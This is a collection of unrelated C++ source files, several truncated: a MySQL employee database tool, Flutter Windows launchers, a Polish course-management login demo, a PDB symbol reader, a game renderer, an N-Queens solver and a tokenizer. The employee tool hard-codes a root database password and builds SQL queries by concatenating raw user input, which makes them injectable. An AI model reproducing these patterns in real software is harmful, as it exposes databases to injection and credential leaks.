    "#include <mysql_driver.h>\n#include <mysql_connection.h>\n#include <cppconn/statement.h>\n#include <iostream>\n#include <string>\n#include <algorithm>\n\n#define max 20\nusing namespace std;\n\n// Structure of Employee\nstruct Employee {\n    string name;\n    long int code;\n    string designation;\n    int exp;\n    int age;\n};\n\nclass EmployeeManagementSystem {\nprivate:\n    Employee emp[max];\n    int num;\n\n    // MySQL Connector variables\n    sql::mysql::MySQL_Driver* driver;\n    sql::Connection* con;\n\n    // Function to initialize MySQL Connector\n    void initMySQL() {\n        try {\n            driver = sql::mysql::get_mysql_driver_instance();\n            con = driver->connect(\"tcp://localhost:3306\", \"root\", \"PHW#84#jeor\");\n            con->setSchema(\"quickstartdb\");\n        }\n        catch (sql::SQLException& e) {\n            cout << \"MySQL Connection Error: \" << e.what() << endl;\n            // Handle the error, perhaps exit the program or return an error code.\n        }\n    }\n\n\n    // Function to close MySQL Connection\n    void closeMySQL() {\n        delete con;\n    }\n\n    // Function to insert an employee into MySQL\n    void insertIntoMySQL(int index) {\n        sql::Statement* stmt = con->createStatement();\n        stmt->execute(\"INSERT INTO EmployeeTable (Name, EmployeeID, Designation, Experience, Age) VALUES ('\" + emp[index].name + \"', \" + to_string(emp[index].code) + \", '\" + emp[index].designation + \"', \" + to_string(emp[index].exp) + \", \" + to_string(emp[index].age) + \")\");\n        delete stmt;\n    }\n\n    // Function to calculate the average experience of all employees\n    void calculateAverageExperience() {\n        initMySQL(); // Initialize MySQL connection\n\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT AVG(Experience) AS AvgExp FROM EmployeeTable\");\n\n        if (res->next()) {\n            cout << \"Average Experience of all employees: \" << res->getDouble(\"AvgExp\") << \" years\\n\";\n        }\n        else {\n            cout << \"Error calculating average experience\\n\";\n        }\n\n        delete res;\n        delete stmt;\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\n    // Function to sort employees by their ID\n    void sortEmployeesByID() {\n        initMySQL(); // Initialize MySQL connection\n\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT * FROM EmployeeTable ORDER BY EmployeeID\");\n\n        cout << \"Employee Records Sorted by ID:\\n\";\n        cout << \"----------------------------------------\\n\";\n        cout << \"ID\\tName\\t\\tDesignation\\tExperience\\tAge\\n\";\n        cout << \"----------------------------------------\\n\";\n\n        while (res->next()) {\n            cout << res->getInt(\"EmployeeID\") << \"\\t\" << res->getString(\"Name\") << \"\\t\" << res->getString(\"Designation\") << \"\\t\" << res->getInt(\"Experience\") << \"\\t\" << res->getInt(\"Age\") << \"\\n\";\n        }\n\n        cout << \"----------------------------------------\\n\";\n\n        delete res;\n        delete stmt;\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\npublic:\n    // Function to build the given datatype\n    void build() {\n        cout << \"insert into The Table\\n\";\n        cout << \"Maximum Entries can be \" << max << \"\\n\";\n\n        cout << \"Enter the number of Entries required: \";\n        cin >> num;\n\n        if (num > 20) {\n            cout << \"Maximum number of Entries is 20\\n\";\n            num = 20;\n        }\n\n        initMySQL(); // Initialize MySQL connection\n\n        cout << \"Enter the following data:\\n\";\n\n        for (int i = 0; i < num; i++) {\n            cout << \"Name: \";\n            cin >> emp[i].name;\n\n            cout << \"Employee ID: \";\n            cin >> emp[i].code;\n\n            cout << \"Designation: \";\n            cin >> emp[i].designation;\n\n            cout << \"Experience: \";\n            cin >> emp[i].exp;\n\n            cout << \"Age: \";\n            cin >> emp[i].age;\n\n            // Insert into MySQL\n            insertIntoMySQL(i);\n        }\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\n    // Function to update employee data\n    void update() {\n        initMySQL(); // Initialize MySQL connection\n\n        cout << \"Enter the Employee ID to update: \";\n        long int empID;\n        cin >> empID;\n\n        // Check if the employee ID exists\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT * FROM EmployeeTable WHERE EmployeeID = \" + to_string(empID));\n\n        if (!res->next()) {\n            cout << \"Employee not found!\\n\";\n        }\n        else {\n            // Update employee data\n            cout << \"Enter the new data:\\n\";\n            cout << \"Name: \";\n            cin >> emp[0].name; // Assuming only the name is updated for simplicity\n\n            stmt->execute(\"UPDATE EmployeeTable SET Name = '\" + emp[0].name + \"' WHERE EmployeeID = \" + to_string(empID));\n            cout ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"data_enhencer\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"displayitemapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\r\n// Created by pawel on 17.05.2024.\r\n//\r\n#include <string>\r\n#include <vector>\r\n#include <map>\r\n#include <iostream>\r\n#include \"Uzytkownik.h\"\r\n#include \"Wydzial.h\"\r\n#include \"Nauczyciel.h\"\r\n#include \"Student.h\"\r\n#include \"System.h\"\r\n#include \"Kurs.h\"\r\n#include \"testy/SystemTest.h\"\r\n#include \"testy/KursTest.h\"\r\n#include \"testy/StudentTest.h\"\r\n#include \"testy/NauczycielTest.h\"\r\n#include \"testy/WydzialTest.h\"\r\n#include \"testy/UzytkownikTest.h\"\r\n\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\nclass Uzytkownik;\r\n\r\nclass Wydzial;\r\n\r\nclass Nauczyciel;\r\n\r\nclass Student;\r\n\r\nclass Kurs;\r\n\r\nclass System;\r\n\r\n\r\nclass SystemTest;\r\n\r\nclass KursTest;\r\n\r\nclass StudentTest;\r\n\r\nclass NauczycielTest;\r\n\r\nclass SystemTest;\r\n\r\nclass WydzialTest;\r\n\r\n\r\nint main() {\r\n\r\n\r\n    System *system = new System(\"System\");\r\n    Wydzial *wydzial1 = new Wydzial(\"Pielegniarstwa\");\r\n    Wydzial *wydzial2 = new Wydzial(\"Medyczny\");\r\n\r\n\r\n    Student *student = new Student(\"Maciek\", \"Nowak\", \"user\", \"user\");\r\n    student->setIndeks(123456);\r\n    system->dodajStudenta(student);\r\n\r\n    Nauczyciel *nauczyciel1 = new Nauczyciel(\"Jan\", \"Nowak\", \"admin\", \"admin\");\r\n    nauczyciel1->dodajWydzial(wydzial1);\r\n\r\n    Nauczyciel *nauczyciel2 = new Nauczyciel(\"Marek\", \"Rocki\", \"admin2\", \"admin2\");\r\n    nauczyciel2->dodajWydzial(wydzial2);\r\n\r\n    wydzial1->dodajNauczyciela(nauczyciel1);\r\n    system->dodajWydzial(wydzial1);\r\n\r\n    wydzial2->dodajNauczyciela(nauczyciel2);\r\n    system->dodajWydzial(wydzial2);\r\n\r\n\r\n    while (true) {\r\n\r\n        cout << \"=============== Witaj w systemie ===============\" << endl;\r\n        cout << \"|                                              |\" << endl;\r\n        cout << \"|            1. Zaloguj                        |\" << endl;\r\n        cout << \"|            2. Wyjdz z systemu                |\" << endl;\r\n        cout << \"|                                              |\" << endl;\r\n        cout << \"================================================\" << endl;\r\n\r\n        int wybor;\r\n        cin >> wybor;\r\n\r\n        if (std::cin.fail()) {\r\n            std::cin.clear();\r\n            std::cin.ignore(10000, '\\n');\r\n            cout << \"================= Blad systemu =================\" << endl;\r\n            cout << \"|                                              |\" << endl;\r\n            cout << \"|               Niepoprawne dane               |\" << endl;\r\n            cout << \"|                                              |\" << endl;\r\n            cout << \"================================================\" << endl;\r\n            continue;\r\n        }\r\n\r\n        if (wybor == 1) {\r\n            string login;\r\n            string haslo;\r\n            cout << \"================== Logowanie ===================\\n\" << endl;\r\n            cout << \"Podaj login: \";\r\n            getline(cin >> ws, login);\r\n            cout << \"Podaj haslo: \";\r\n            getline(cin >> ws, haslo);\r\n            cout << \"\\n================================================\" << endl;\r\n            if (system->zaloguj(login, haslo)) {\r\n\r\n                if (system->czyJestStudentem(login, haslo)) {\r\n\r\n                    Student *student = nullptr;\r\n                    for (int i = 0; i < system->getStudenci().size(); i++) {\r\n                        if (system->getStudenci()[i]->getLogin() == login) {\r\n                            student = system->getStudenci()[i];\r\n                        }\r\n                    }\r\n\r\n                    cout << \"=============== Panel Studenta =================\" << endl;\r\n                    cout << \" \" << endl;\r\n                    cout << \"       \" << \"Zalogowano jako student \" << student->getImie() << \" \" << student->getNazwisko() << endl;\r\n                    cout << \" \" << endl;\r\n                    cout << \"================================================\" << endl;\r\n\r\n                    while (true) {\r\n                        cout << \"===================== Menu =====================\" << endl;\r\n                        cout << \"|                                              |\" << endl;\r\n                        cout << \"|  1. Wyswietl zapisane kursy                  |\" << endl;\r\n                        cout << \"|  2. Wybierz kurs do ktorego jestes zapisany  |\" << endl;\r\n                        cout << \"|  3. Wybierz wydzial                          |\" << endl;\r\n                        cout << \"|  4. Wyloguj                                  |\" << endl;\r\n                        cout << \"|                                              |\" << endl;\r\n                        cout << \"================================================\" << endl;\r\n\r\n                        int wybor;\r\n                        cin >> wybor;\r\n\r\n                        if (std::cin.fail()) {\r\n                            std::cin.clear();\r\n                            std::cin.ignore(10000, '\\n');\r\n                            cout << \"================= Blad systemu =================\" << endl;\r\n                            cout << \"|                                              |\" << endl;\r\n           ",
    "#include <format>\n#include <ranges>\n#include <regex>\n#include \"DiaSymbols.h\"\n#include \"RegistersMapping.h\"\n\nHRESULT NoRegCoCreate(std::wstring_view DllName, REFCLSID Rclsid, REFIID Riid, void** Ppv)\n{\n\tconst auto mod = LoadLibraryW(DllName.data());\n\tif (!mod)\n\t{\n\t\treturn REASON_UNKNOWN;\n\t}\n\n\tconst auto dllGetClassObject = reinterpret_cast<HRESULT(__stdcall*)(REFCLSID, REFIID, LPVOID*)>(GetProcAddress(mod, \"DllGetClassObject\"));\n\tif (!dllGetClassObject)\n\t{\n\t\treturn REASON_UNKNOWN;\n\t}\n\n\tIClassFactory* classFactory{};\n\tif (FAILED(dllGetClassObject(Rclsid, IID_IClassFactory, reinterpret_cast<void**>(&classFactory))))\n\t{\n\t\treturn REASON_UNKNOWN;\n\t}\n\n\tconst auto result = classFactory->CreateInstance(nullptr, Riid, Ppv);\n\tclassFactory->AddRef();\n\treturn result;\n}\n\nDiaSymbols::DiaSymbols(std::wstring_view PdbPath)\n{\n\tif (!SetSessionAndGlobal(PdbPath))\n\t{\n\t\tthrow;\n\t}\n\n\tm_GlobalSymbol->get_machineType(&m_MachineType);\n}\n\nbool DiaSymbols::SetSessionAndGlobal(std::wstring_view PdbPath)\n{\n\tauto status = CoInitialize(nullptr);\n\tif (FAILED(status))\n\t{\n\t\treturn false;\n\t}\n\n\tCComPtr<IDiaDataSource> dataSource{};\n\tstatus = NoRegCoCreate(L\"msdia140.dll\", __uuidof(DiaSource), __uuidof(IDiaDataSource), reinterpret_cast<void**>(&dataSource));\n\tif (FAILED(status))\n\t{\n\t\treturn false;\n\t}\n\n\tstatus = dataSource->loadDataFromPdb(PdbPath.data());\n\tif (FAILED(status))\n\t{\n\t\treturn false;\n\t}\n\n\tif (FAILED(dataSource->openSession(&m_Session)))\n\t{\n\t\treturn false;\n\t}\n\n\treturn SUCCEEDED(m_Session->get_globalScope(&m_GlobalSymbol));\n}\n\nstd::vector<DiaSymbols::SectionData> DiaSymbols::GetSectionsData()\n{\n\tstd::vector<DiaSymbols::SectionData> sections{};\n\n\tCComPtr<IDiaEnumTables> enumTables{};\n\tif (FAILED(m_Session->getEnumTables(&enumTables)))\n\t{\n\t\treturn {};\n\t}\n\n\tIDiaTable* tmpPointer{};\n\tULONG celt{};\n\twhile (SUCCEEDED(enumTables->Next(1, &tmpPointer, &celt)) && celt == 1)\n\t{\n\t\tCComPtr<IDiaTable> diaTable{ tmpPointer };\n\t\tBSTR name{};\n\t\tif (FAILED(diaTable->get_name(&name)) || !name)\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (std::wstring_view{ name } != L\"SegmentMap\")\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tCComPtr<IDiaEnumSegments> enumSegments{};\n\t\tif (FAILED(diaTable->QueryInterface(_uuidof(IDiaEnumSegments), reinterpret_cast<void**>(&enumSegments))))\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tIDiaSegment* tmpPointer{};\n\t\twhile (SUCCEEDED(enumSegments->Next(1, &tmpPointer, &celt)) && celt == 1)\n\t\t{\n\t\t\tCComPtr<IDiaSegment> diaSegment{ tmpPointer };\n\t\t\tSectionData section{};\n\n\t\t\tif (FAILED(diaSegment->get_virtualAddress(&section.Address)) || FAILED(diaSegment->get_length(&section.Size)) ||\n\t\t\t\tFAILED(diaSegment->get_read(&section.Read)) || FAILED(diaSegment->get_write(&section.Write)) || FAILED(diaSegment->get_execute(&section.Execute)))\n\t\t\t{\n\t\t\t\treturn {};\n\t\t\t}\n\n\t\t\tif (!section.Address && section.Size == -1)\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (section.Address % 0x1000)\n\t\t\t{\n\t\t\t\tsections.rbegin()->Size += section.Size;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tsections.emplace_back(std::move(section));\n\t\t\t}\n\t\t}\n\t}\n\n\treturn sections;\n}\n\nsrcsync::PublicSymbolsData DiaSymbols::GetPublicSymbols()\n{\n\tCComPtr<IDiaEnumSymbols> enumSymbols{};\n\tif (FAILED(m_GlobalSymbol->findChildren(SymTagPublicSymbol, NULL, nsNone, &enumSymbols)))\n\t{\n\t\treturn {};\n\t}\n\n\tsrcsync::PublicSymbolsData result{};\n\tIDiaSymbol* tmpPointer{};\n\tULONG celt{};\n\twhile (SUCCEEDED(enumSymbols->Next(1, &tmpPointer, &celt)) && celt == 1)\n\t{\n\t\tCComPtr<IDiaSymbol> symbol{ tmpPointer };\n\t\tif (auto symbolData = GetSymbol(symbol); symbolData.has_value())\n\t\t{\n\t\t\tresult.emplace_back(std::move(*symbolData));\n\t\t}\n\t}\n\n\treturn result;\n}\n\nsrcsync::StructsData DiaSymbols::GetStructs()\n{\n\tCComPtr<IDiaEnumSymbols> enumSymbols{};\n\tif (FAILED(m_GlobalSymbol->findChildren(SymTagUDT, NULL, nsNone, &enumSymbols)))\n\t{\n\t\treturn {};\n\t}\n\n\tIDiaSymbol* tmpPointer{};\n\tULONG celt{};\n\tsrcsync::StructsData result{};\n\twhile (SUCCEEDED(enumSymbols->Next(1, &tmpPointer, &celt)) && celt == 1)\n\t{\n\t\tCComPtr<IDiaSymbol> symbol{ tmpPointer };\n\t\tauto structWithMembers = GetStructWithMembers(symbol);\n\t\tif (!structWithMembers.has_value())\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tresult.emplace_back(std::move(*structWithMembers));\n\t}\n\n\treturn result;\n}\n\nsrcsync::EnumsData DiaSymbols::GetEnums()\n{\n\tsrcsync::EnumsData enums{};\n\n\tCComPtr<IDiaEnumSymbols> enumSymbols{};\n\tif (FAILED(m_GlobalSymbol->findChildren(SymTagEnum, NULL, nsNone, &enumSymbols)))\n\t{\n\t\treturn {};\n\t}\n\n\tIDiaSymbol* tmpPointer{};\n\tULONG celt{};\n\twhile (SUCCEEDED(enumSymbols->Next(1, &tmpPointer, &celt)) && celt == 1)\n\t{\n\t\tCComPtr<IDiaSymbol> symbol{ tmpPointer };\n\t\tauto enumWithMembers = GetEnum(symbol);\n\t\tif (!enumWithMembers.has_value())\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tenums.emplace_back(std::move(*enumWithMembers));\n\t}\n\n\treturn enums;\n}\n\nsrcsync::FunctionsData DiaSymbols::GetFunctionsData()\n{\n\tsrcsync::FunctionsData functionsData{};\n\n\tauto addFunctionData = [&](const auto& EnumSymbols) {\n\t\tIDiaSymbol* tmpPointer{};\n\t\tULONG celt{};\n\t\twhile (SUCCEEDED(EnumSymbols->Next(1, &tmpPointer, &celt)) && celt == 1)\n\t\t{\n\t\t\tCComPtr<IDiaSymbol> symbol{ tmpPointer };\n\t\t\ta",
    "#include \"GameRenderer.h\"\n#include \"SDLRenderWrapper.h\"\n#include \"Configs.h\"\n\n#define ABOVE_UI_POS_Y WINDOW_HEIGHT / 100\n#define UI_BARS_WIDTH WINDOW_WIDTH / 10\n#define UI_BARS_HEIGHT WINDOW_HEIGHT / 40\n#define PUSH_UI_POS_X WINDOW_WIDTH / 1.2f\n#define SCORE_UI_POS_X WINDOW_WIDTH / 2\n\nInGameRenderer::InGameRenderer(std::shared_ptr<BoardLogic> boardLogic, std::shared_ptr<RenderWrapperBase> render)\n{\n\tthis->boardLogic = boardLogic;\n\tthis->render = render;\n}\n\nvoid InGameRenderer::UpdateRender(std::vector<Button> buttons, int score,int levelScore, int level, int pointsToNextLevel, float pushTimer, float maxPushTimer)\n{\n\trender->DrawRectangle(0, 0, WINDOW_WIDTH, WINDOW_HEIGHT, BACKGROUND_COLOR);\n\trender->RenderImage(ENDLINE_IMAGE, WINDOW_WIDTH - TILE_SIDE * BOARD_MAX_COLUMN_SIZE - WINDOW_WIDTH/ 150, WINDOW_HEIGHT/5, WINDOW_WIDTH / 150, WINDOW_HEIGHT, 1);\n\trender->RenderText(\"End Zone\", FONT_LOCATION, WINDOW_WIDTH/40, WINDOW_WIDTH - TILE_SIDE * BOARD_MAX_COLUMN_SIZE, WINDOW_HEIGHT / 8, 1, false, { {255,255,255} });\n\n\tRenderBoardTiles();\n\n\trender->RenderText(\"Score:\" + std::to_string(score), FONT_LOCATION, WINDOW_HEIGHT / 30, UI_BARS_HEIGHT*1.4f, UI_BARS_HEIGHT * .2f, 1, false, { TEXT_COLOR });\n\n\trender->RenderText(\"Level:\" + std::to_string(level), FONT_LOCATION, WINDOW_HEIGHT / 30, SCORE_UI_POS_X - WINDOW_WIDTH/10, UI_BARS_HEIGHT*.2f, 1,false, { TEXT_COLOR });\n\trender->DrawRectangle(SCORE_UI_POS_X, ABOVE_UI_POS_Y, UI_BARS_WIDTH, UI_BARS_HEIGHT, DARK_GREEN_COLOR);\n\trender->DrawRectangle(SCORE_UI_POS_X, ABOVE_UI_POS_Y, UI_BARS_WIDTH *(float)levelScore / pointsToNextLevel, UI_BARS_HEIGHT, GREEN_COLOR);\n\t\n\trender->RenderText(\"Push:\", FONT_LOCATION, WINDOW_HEIGHT / 30, PUSH_UI_POS_X - WINDOW_WIDTH / 15, UI_BARS_HEIGHT * .2f, 1, false, { TEXT_COLOR });\n\trender->DrawRectangle(PUSH_UI_POS_X, ABOVE_UI_POS_Y, UI_BARS_WIDTH, UI_BARS_HEIGHT, DARK_RED_COLOR);\n\trender->DrawRectangle(PUSH_UI_POS_X, ABOVE_UI_POS_Y, UI_BARS_WIDTH * (float)pushTimer/maxPushTimer, UI_BARS_HEIGHT, RED_COLOR);\n\n\n\tfor (auto& button : buttons)\n\t{\n\t\trender->RenderImage(BUTTON_IMAGE, button.x, button.y, button.width, button.height, 1);\n\t\trender->RenderText(button.text, FONT_LOCATION, button.width / 4, button.x + button.width / 2, button.y + button.height / 2.5f, 1, true);\n\t}\n\n\trender->UpdateRender();\n}\n\nvoid InGameRenderer::RenderBoardTiles()\n{\n\tfor (size_t column_index = 0; column_index < boardLogic->GetTiles().size(); ++column_index) {\n\t\tauto& column = boardLogic->GetTiles()[column_index];\n\t\tfor (size_t tile_index = 0; tile_index < column.size(); ++tile_index) {\n\t\t\tauto& tile = column[tile_index];\n\t\t\tif (tile.GetColor() == Colors::Empty)\n\t\t\t\tcontinue;\n\n\t\t\tColor color = { 255,255,255 };\n\t\t\tswitch (tile.GetColor()) {\n\t\t\tcase Colors::Blue:\n\t\t\t\tcolor = BLUE_COLOR;\n\t\t\t\tbreak;\n\t\t\tcase Colors::Green:\n\t\t\t\tcolor = GREEN_COLOR;\n\t\t\t\tbreak;\n\t\t\tcase Colors::Red:\n\t\t\t\tcolor = RED_COLOR;\n\t\t\t\tbreak;\n\t\t\tcase Colors::Yellow:\n\t\t\t\tcolor = YELLOW_COLOR;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\trender->RenderImage(TILE_GREY_IMAGE, tile.GetX(), tile.GetY(), TILE_SIDE, TILE_SIDE, 1, color);\n\t\t\t//render->RenderText(std::to_string(column_index) + \",\" + std::to_string(tile_index),\n\t\t\t//FONT_LOCATION, 15, tile.GetX(), tile.GetY(), 1, false, { {255,255,255} });\n\t\t}\n\t}\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n#define N 4\r\n\r\nbool isSafe(int board[N][N], int row, int col)\r\n{\r\n\tfor (int i = 0; i < col; i++){\r\n\t\tif (board[row][i])\r\n\t\t\treturn false;\r\n\t}\r\n\tfor (int i = row, j = col; i >= 0 && j >= 0; i--, j--){\r\n\t\tif (board[i][j])\r\n\t\t\treturn false;\r\n\t}\r\n\tfor (int i = row, j = col; j >= 0 && i < N; i++, j--){\r\n\t\tif (board[i][j])\r\n\t\t\treturn false;\r\n\t}\r\n\treturn true;\r\n}\r\n\r\nbool solveNQUtil(int board[N][N], int col)\r\n{\r\n\tif (col >= N)\r\n\t\treturn true;\r\n\r\n\tfor (int i = 0; i < N; i++) {\r\n\t\tif (isSafe(board, i, col)) {\r\n\t\t\tboard[i][col] = 1;\r\n\t\t\tif (solveNQUtil(board, col + 1))\r\n\t\t\t\treturn true;\r\n\r\n\t\t\tboard[i][col] = 0; \r\n\t\t}\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nint main()\r\n{\r\n\tint board[N][N] = { { 0, 0, 0, 0 },\r\n\t\t\t\t\t\t{ 0, 0, 0, 0 },\r\n\t\t\t\t\t\t{ 0, 0, 0, 0 },\r\n\t\t\t\t\t\t{ 0, 0, 0, 0 } };\r\n\r\n\tif (solveNQUtil(board, 0) == false) {\r\n\t\tcout << \"Solution does not exist\";\r\n\t\treturn false;\r\n\t}\r\n\t\r\n\tfor (int i = 0; i < N; i++) {\r\n\t\tfor (int j = 0; j < N; j++)\r\n\t\tif(board[i][j])\r\n\t\t\tcout << \"Q \";\r\n\t\telse cout<<\". \";\r\n\t\tcout<<(\"\\n\");\r\n\t}\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "#undef NDEBUG\r\n#include <iostream>\r\n#include <cassert>\r\n#include <fstream>\r\n#include <cstdint>\r\n#include <cstdlib>\r\n#include <vector>\r\n\r\ninline static char* findFirst(char* str, char c)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (*_c == c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c == *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c != *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (!f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\n#pragma pack(2)\r\nstruct String\r\n{\r\n\tchar* start;\r\n\tuint16_t length;\r\n\r\n\ttemplate <typename T>\r\n\tinline T applyAsNormalString(T f(const char*)) const\r\n\t{\r\n\t\tchar ei = start[length];\r\n\t\tstart[length] = '\\0';\r\n\t\tT v = f(start);\r\n\t\tstart[length] = ei;\r\n\t\treturn v;\r\n\t}\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tfor (uint16_t i = 0; i < length; i++)\r\n\t\t\tputchar(start[i]);\r\n\t}\r\n\r\n\tinline long long toInt() const\r\n\t{\r\n\t\treturn applyAsNormalString(atoll);\r\n\t}\r\n\r\n\tinline double toDouble() const\r\n\t{\r\n\t\treturn applyAsNormalString(atof);\r\n\t}\r\n};\r\n\r\ninline static void todo(const char* str)\r\n{\r\n\tstd::cout << \"TODO: \" << str;\r\n\tabort();\r\n}\r\n\r\nnamespace tokenKinds\r\n{\r\n\tconstexpr uint8_t\r\n\t\tnumber = 0,\r\n\t\talpha = 1,\r\n\t\tsolo = 2,\r\n\t\tstring = 3;\r\n\r\n\tconst char* names[] = {\r\n\t\t\"number\",\r\n\t\t\"alpha\",\r\n\t\t\"solo\",\r\n\t\t\"\\033[32mstring\"\r\n\t};\r\n}\r\n\r\nstruct Token\r\n{\r\n\tString str;\r\n\tuint8_t kind;\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tstd::cout << tokenKinds::names[kind] << \"\\033[0m\\t'\\033[36m\";\r\n\r\n\t\tstr.print();\r\n\r\n\t\tstd::cout << \"\\033[0m'\\n\";\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tstd::vector<Token> tokens;\r\n\r\n\tstd::ifstream file(\"test.jiw\");\r\n\tassert(file.is_open());\r\n\r\n\tfile.seekg(0, std::ios::end);\r\n\tsize_t fileSize = file.tellg();\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\tchar* buffer = (char*)malloc(fileSize);\r\n\tassert(buffer != nullptr);\r\n\r\n\tfile.read(buffer, fileSize);\r\n\tfile.close();\r\n\r\n\tuint8_t kind;\r\n\tchar* end = nullptr;\r\n\tfor (char* c = buffer; *c != '\\0';)\r\n\t{\r\n\t\tif (isspace(*c))\r\n\t\t{\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\telse if (isdigit(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isdigit);\r\n\t\t\tkind = tokenKinds::number;\r\n\t\t}\r\n\t\telse if (isalpha(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isalnum);\r\n\t\t\tkind = tokenKinds::alpha;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (*c == '/')\r\n\t\t\t{\r\n\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t{\r\n\t\t\t\t\tc = findFirst(c + 2, '\\n') + 1;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\telse if (c[1] == '*')\r\n\t\t\t\t{\r\n\t\t\t\t\tc++;\r\n\t\t\t\t\twhile (true)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tc = findFirst(c + 1, '*');\r\n\t\t\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tc += 2;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\ttokens.push_back({ { c, 1 }, tokenKinds::solo });\r\n\r\n\t\t\tif (*c == '\"')\r\n\t\t\t{\r\n\t\t\t\tend = findFirst(++c, '\"');\r\n\t\t\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, tokenKinds::string });\r\n\t\t\t\ttokens.push_back({ { c = end, 1 }, tokenKinds::solo 